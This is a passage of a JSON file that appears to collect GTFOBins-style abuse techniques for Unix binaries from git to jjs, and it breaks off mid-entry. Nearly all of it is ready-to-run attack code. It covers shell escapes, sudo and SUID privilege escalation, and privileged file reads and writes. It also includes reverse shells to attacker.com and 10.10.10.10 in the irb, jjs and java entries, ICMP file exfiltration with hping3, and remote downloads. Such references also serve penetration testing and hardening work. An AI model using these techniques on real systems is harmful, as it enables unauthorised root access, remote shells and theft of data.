        "name": "git",
        "url": "https://gtfobins.github.io/gtfobins/git/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "PAGER='sh -c \"exec sh 0<&1\"' git -p help"
                    },
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "git help config\n!/bin/sh"
                    },
                    {
                        "description": "The help system can also be reached from any git command, e.g., git branch. This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "git branch --help config\n!/bin/sh"
                    },
                    {
                        "description": "Git hooks are merely shell scripts and in the following example the hook associated to the pre-commit action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the -C option.",
                        "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\ngit \"--exec-path=$TF\" x"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The patch can be created locally by creating the file that will be written on the target using its absolute path, then git diff /dev/null /path/to/file >x.patch.",
                        "code": "git apply --unsafe-paths --directory / x.patch"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file content is displayed in diff style output format.",
                        "code": "LFILE=file_to_read\ngit diff /dev/null $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
                    },
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo git -p help config\n!/bin/sh"
                    },
                    {
                        "description": "The help system can also be reached from any git command, e.g., git branch. This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo git branch --help config\n!/bin/sh"
                    },
                    {
                        "description": "Git hooks are merely shell scripts and in the following example the hook associated to the pre-commit action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the -C option.",
                        "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which git) .\n\nPAGER='sh -c \"exec sh 0<&1\"' ./git -p help"
                    }
                ]
            }
        ]
    },
    {
        "name": "grc",
        "url": "https://gtfobins.github.io/gtfobins/grc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "grc --pty /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo grc --pty /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "grep",
        "url": "https://gtfobins.github.io/gtfobins/grep/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "There are many grep flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: egrep, fgrep, zgrep, etc."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ngrep '' $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which grep) .\n\nLFILE=file_to_read\n./grep '' $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo grep '' $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "gtester",
        "url": "https://gtfobins.github.io/gtfobins/gtester/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Data to be written appears in an XML attribute in the output file (<testbinary path=\"DATA\">).",
                        "code": "LFILE=file_to_write\ngtester \"DATA\" -o $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which gtester) .\n\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "gzip",
        "url": "https://gtfobins.github.io/gtfobins/gzip/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "There are also a number of other utilities that rely on gzip under the hood, e.g., zless, zcat, gunzip, etc. Besides having similar features, they also allow privileged reads if gzip itself is SUID."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ngzip -f $LFILE -t"
                    },
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ngzip -c $LFILE | gzip -d"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which gzip) .\n\nLFILE=file_to_read\n./gzip -f $LFILE -t"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo gzip -f $LFILE -t"
                    }
                ]
            }
        ]
    },
    {
        "name": "hexdump",
        "url": "https://gtfobins.github.io/gtfobins/hexdump/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The output is actually an hex dump."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nhexdump -C \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which hexdump) .\n\nLFILE=file_to_read\n./hexdump -C \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "hd",
        "url": "https://gtfobins.github.io/gtfobins/hd/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The output is actually an hex dump."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nhd \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which hd) .\n\nLFILE=file_to_read\n./hd \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo hd \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "head",
        "url": "https://gtfobins.github.io/gtfobins/head/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nhead -c1G \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which head) .\n\nLFILE=file_to_read\n./head -c1G \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "hping3",
        "url": "https://gtfobins.github.io/gtfobins/hping3/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "hping3\n/bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which hping3) .\n\n./hping3\n/bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo hping3\n/bin/sh"
                    },
                    {
                        "description": "The file is continuously sent, adjust the --count parameter or kill the sender when done. Receive on the attacker box with:",
                        "code": "sudo hping3 --icmp --listen xxx --dump"
                    },
                    {
                        "code": "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "highlight",
        "url": "https://gtfobins.github.io/gtfobins/highlight/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which highlight) .\n\nLFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "iconv",
        "url": "https://gtfobins.github.io/gtfobins/iconv/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The 8859_1 encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which iconv) .\n\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "iftop",
        "url": "https://gtfobins.github.io/gtfobins/iftop/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This requires iftop 0.17 and the privilege to capture on some device (specify with -i if needed) ."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "iftop\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo iftop\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which iftop) .\n\n./iftop\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "install",
        "url": "https://gtfobins.github.io/gtfobins/install/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This can be run with elevated privileges to change permissions (6 denotes the SUID bits) and then read, write, or execute a copy of the file."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which install) .\n\nLFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "ionice",
        "url": "https://gtfobins.github.io/gtfobins/ionice/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ionice /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ionice) .\n\n./ionice /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ionice /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "ip",
        "url": "https://gtfobins.github.io/gtfobins/ip/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The read file content is corrupted by error prints."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nip -force -batch \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ip) .\n\nLFILE=file_to_read\n./ip -force -batch \"$LFILE\""
                    },
                    {
                        "description": "This only works for Linux with CONFIG_NET_NS=y.",
                        "code": "sudo install -m =xs $(which ip) .\n\n./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\""
                    },
                    {
                        "description": "This only works for Linux with CONFIG_NET_NS=y.",
                        "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo"
                    },
                    {
                        "description": "This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.",
                        "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar"
                    }
                ]
            }
        ]
    },
    {
        "name": "irb",
        "url": "https://gtfobins.github.io/gtfobins/irb/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "irb\nexec '/bin/bash'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Serve files in the local folder running an HTTP server on port 8888.",
                        "code": "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "irb\nputs File.read(\"file_to_read\")"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo irb\nexec '/bin/bash'"
                    }
                ]
            }
        ]
    },
    {
        "name": "ispell",
        "url": "https://gtfobins.github.io/gtfobins/ispell/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ispell /etc/passwd\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ispell) .\n\n./ispell /etc/passwd\n!/bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ispell /etc/passwd\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "java",
        "url": "https://github.com/SkyW4r33x",
        "functions": [
            {
                "function": "Sudo",
                "description": "Si se permite que Java se ejecute con privilegios de superusuario mediante sudo, se puede explotar para crear una reverse shell. Esto permite al atacante obtener acceso remoto al sistema con privilegios elevados.",
                "examples": [
                    {
                        "description": "Maquina atacante - Configurar listener",
                        "code": "nc -nlvp 444"
                    },
                    {
                        "description": "Maquina victima - Crear archivo en /tmp/",
                        "code": "cd /tmp/\ntouch shell.java"
                    },
                    {
                        "description": "Contenido de shell.java - Reverse Shell",
                        "code": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/10.10.10.10/444 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}"
                    },
                    {
                        "description": "Ejecutar con privilegios sudo",
                        "code": "sudo /usr/bin/java shell.java"
                    }
                ]
            }
        ]
    },
    {
        "name": "jjs",
        "url": "https://gtfobins.github.io/gtfobins/jjs/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This tool is installed starting with Java SE 8."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs"
                    }
                ]
            },
            {
                "function": "SUID",
